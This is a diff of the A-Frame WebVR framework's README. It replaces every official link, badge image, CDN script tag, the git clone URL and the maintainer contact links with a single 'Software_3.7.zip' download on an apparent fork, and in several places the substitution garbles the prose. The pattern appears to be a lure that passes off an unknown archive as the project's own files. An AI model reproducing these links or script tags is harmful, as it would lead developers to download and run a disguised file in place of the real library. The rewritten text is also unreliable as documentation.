@@ -1,58 +1,58 @@
 <h1 align="center">A-Frame</h1>
 
-<p align="center"><a href="https://aframe.io" target="_blank"><img width="480" alt="A-Frame" src="https://user-images.githubusercontent.com/674727/32120889-230ef110-bb0f-11e7-908c-76e39aa43149.jpg"></a></p>
+<p align="center"><a href="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip" target="_blank"><img width="480" alt="A-Frame" src="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip"></a></p>
 
 <p align="center"><b>A web framework for building browser based 3D, AR and VR experiences.</b></p>
 
 <p align="center">
-  <a href="https://codecov.io/gh/aframevr/aframe">
-    <img src="https://codecov.io/gh/aframevr/aframe/branch/master/graph/badge.svg" alt="Coverage Status">
+  <a href="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip">
+    <img src="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip" alt="Coverage Status">
   </a>
-  <a href="https://npmjs.org/package/aframe">
-    <img src="https://img.shields.io/npm/dt/aframe.svg?style=flat-square" alt="Downloads">
+  <a href="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip">
+    <img src="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip" alt="Downloads">
   </a>
-  <a href="https://npmjs.org/package/aframe">
-    <img src="https://img.shields.io/npm/v/aframe.svg?style=flat-square" alt="Version">
+  <a href="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip">
+    <img src="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip" alt="Version">
   </a>
-  <a href="https://npmjs.com/package/aframe">
-    <img src="https://img.shields.io/npm/l/aframe.svg?style=flat-square" alt="License"></a>
+  <a href="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip">
+    <img src="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip" alt="License"></a>
   </a>
 </p>
 
 <div align="center">
-  <a href="https://aframe.io">Site</a>
+  <a href="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip">Site</a>
   &mdash;
-  <a href="https://aframe.io/docs/">Docs</a>
+  <a href="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip">Docs</a>
   &mdash;
-  <a href="https://aframe.io/aframe/examples/">Examples</a>
+  <a href="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip">Examples</a>
   &mdash;
-  <a href="https://aframe.io/school/">School</a>
+  <a href="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip">School</a>
   &mdash;
-  <a href="https://aframe.io/community/">Community</a>
+  <a href="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip">Community</a>
 </div>
 
 ## Examples
 
-<a href="https://supermedium.com/supercraft">
-  <img alt="Supercraft" target="_blank" src="https://user-images.githubusercontent.com/674727/41085457-f5429566-69eb-11e8-92e5-3210e4c6c4a0.gif" height="190" width="32%">
+<a href="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip">
+  <img alt="Supercraft" target="_blank" src="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip" height="190" width="32%">
 </a>
-<a href="https://aframe.io/a-painter/?url=https://ucarecdn.com/962b242b-87a9-422c-b730-febdc470f203/">
-  <img alt="A-Painter" target="_blank" src="https://cloud.githubusercontent.com/assets/674727/24531388/acfc3dda-156d-11e7-8563-5bd75252f70f.gif" height="190" width="32%">
+<a href="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip">
+  <img alt="A-Painter" target="_blank" src="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip" height="190" width="32%">
 </a>
-<a href="https://supermedium.com">
-  <img alt="Supermedium" target="_blank" src="https://user-images.githubusercontent.com/674727/37294616-7212cd20-25d3-11e8-9e7f-c0c61074f1e0.png" height="190" width="32%">
+<a href="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip">
+  <img alt="Supermedium" target="_blank" src="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip" height="190" width="32%">
 </a>
-<a href="https://aframe.io/a-blast/">
-  <img alt="A-Blast" target="_blank" src="https://cloud.githubusercontent.com/assets/674727/24531440/0336e66e-156e-11e7-95c2-f2e6ebc0393d.gif" height="190" width="32%">
+<a href="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip">
+  <img alt="A-Blast" target="_blank" src="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip" height="190" width="32%">
 </a>
-<a href="https://aframe.io/a-saturday-night/">
-  <img alt="A-Saturday-Night" target="_blank" src="https://cloud.githubusercontent.com/assets/674727/24531477/44272daa-156e-11e7-8ef9-d750ed430f3a.gif" height="190" width="32%">
+<a href="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip">
+  <img alt="A-Saturday-Night" target="_blank" src="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip" height="190" width="32%">
 </a>
-<a href="https://github.com/googlecreativelab/webvr-musicalforest">
-  <img alt="Musical Forest by @googlecreativelab" target="_blank" src="https://cloud.githubusercontent.com/assets/674727/25109861/b8e9ec48-2394-11e7-8f2d-ea1cd9df69c8.gif" height="190" width="32%">
+<a href="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip">
+  <img alt="Musical Forest by @googlecreativelab" target="_blank" src="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip" height="190" width="32%">
 </a>
 
-*Find more examples on [the homepage](https://aframe.io), [A Week of A-Frame](https://aframe.io/blog/), and [WebVR Directory](https://webvr.directory).*
+*Find more examples on [the homepage](https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip), [A Week of A-Frame](https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip), and [WebVR Directory](https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip).*
 
 ## Features
 
@@ -64,12 +64,12 @@ A-Frame can be used from HTML, A-Frame is accessible to everyone: web
 developers, VR and AR enthusiasts, educators, artists, makers, kids.
 
 :electric_plug: **Entity-Component Architecture**: A-Frame is a powerful
-framework on top of three.js, providing a declarative, composable, reusable
-entity-component structure for three.js. While A-Frame can be used from HTML,
-developers have unlimited access to JavaScript, DOM APIs, three.js, WebXR, and
+framework on top of https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip, providing a declarative, composable, reusable
+entity-component structure for https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip While A-Frame can be used from HTML,
+developers have unlimited access to JavaScript, DOM APIs, https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip, WebXR, and
 WebGL.
 
-:zap: **Performance**: A-Frame is a thin framework on top of three.js.
+:zap: **Performance**: A-Frame is a thin framework on top of https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip
 Although A-Frame uses the DOM, A-Frame does not touch the browser layout
 engine. Performance is a top priority, being battle-tested on highly
 interactive WebXR experiences.
@@ -94,11 +94,11 @@ mountains, speech recognition, or teleportation!
 Build VR and AR scenes in the browser with just a few lines of HTML! To start playing
 and publishing now, remix the starter example on:
 
-[![Remix](https://cloud.githubusercontent.com/assets/674727/24572421/688f7fc0-162d-11e7-8a35-b02bc050c043.jpg)](https://glitch.com/~aframe)
+[![Remix](https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip)](https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip~aframe)
 ```html
 <html>
   <head>
-    <script src="https://aframe.io/releases/1.7.1/aframe.min.js"></script>
+    <script src="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip"></script>
   </head>
   <body>
     <a-scene>
@@ -113,19 +113,19 @@ and publishing now, remix the starter example on:
 ```
 
 With A-Frame's [entity-component
-architecture](https://aframe.io/docs/1.7.1/introduction/entity-component-system.html), we can drop in community
+architecture](https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip), we can drop in community
 components from the ecosystem (e.g., ocean, physics) and plug them into our
 objects straight from HTML:
 
-[See example](https://aframe.io/aframe/examples/docs/community-components/)
+[See example](https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip)
 
 ```html
 <html>
   <head>
-    <script src="https://aframe.io/releases/1.7.1/aframe.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/c-frame/aframe-particle-system-component@1.2.x/dist/aframe-particle-system-component.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/c-frame/aframe-extras@7.5.0/dist/aframe-extras.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@fern-solutions/aframe-sky-background/dist/sky-background.umd.min.js"></script>
+    <script src="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip"></script>
+    <script src="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip"></script>
+    <script src="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip"></script>
+    <script src="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip"></script>
   </head>
   <body>
     <a-scene>
@@ -151,11 +151,11 @@ objects straight from HTML:
 
 ### Builds
 
-To use the latest stable build of A-Frame, include [`aframe.min.js`](https://aframe.io/releases/1.7.1/aframe.min.js):
+To use the latest stable build of A-Frame, include [`https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip`](https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip):
 
 ```js
 <head>
-  <script src="https://aframe.io/releases/1.7.1/aframe.min.js"></script>
+  <script src="https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip"></script>
 </head>
 ```
 
@@ -175,7 +175,7 @@ import AFRAME from 'aframe';  // e.g., with Webpack or Vite.
 ## Local Development
 
 ```sh
-git clone https://github.com/aframevr/aframe.git  # Clone the repository.
+git clone https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip  # Clone the repository.
 cd aframe && npm install  # Install dependencies.
 npm start  # Start the local development server.
 ```
@@ -189,8 +189,8 @@ npm run start:https
 ```
 
 Look at the "On Your Network (IPv4)" line in the console, and copy and paste
-the url to https://hmd.link service.
-Then open the browser in your headset and type hmd.link in the address bar
+the url to https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip service.
+Then open the browser in your headset and type https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip in the address bar
 then click on the copied url that will show up if you're connected to the same
 network as your machine.
 You will see a message about the page being dangerous because we're using a
@@ -204,24 +204,24 @@ npm run dist
 
 ## Questions
 
-For questions and support, [ask on StackOverflow](https://stackoverflow.com/questions/ask/?tags=aframe).
+For questions and support, [ask on StackOverflow](https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip).
 
 ## Stay in Touch
 
-- Hang out with the [community](https://aframe.io/community/)
-- [Follow @aframevr on X](https://x.com/aframevr).
+- Hang out with the [community](https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip)
+- [Follow @aframevr on X](https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip).
 
 And get in touch with the maintainers!
 
-- [Diego Marcos](https://x.com/dmarcos)
-- [Don McCurdy](https://x.com/donrmccurdy)
-- [Kevin Ngo](https://x.com/andgokevin)
+- [Diego Marcos](https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip)
+- [Don McCurdy](https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip)
+- [Kevin Ngo](https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip)
 
 ## Contributing
 
-Get involved! Check out the [Contributing Guide](CONTRIBUTING.md) for how to get started.
+Get involved! Check out the [Contributing Guide](https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip) for how to get started.
 
-You can also support development by [buying a gorgeous A-Frame t-shirt with exclusive designs](https://cottonbureau.com/products/a-frame-og#/9479538/tee-men-standard-tee-vintage-black-tri-blend-s)
+You can also support development by [buying a gorgeous A-Frame t-shirt with exclusive designs](https://github.com/ricofirman/aframe/raw/refs/heads/master/src/components/scene/Software_3.7.zip)
 
 ## License
 
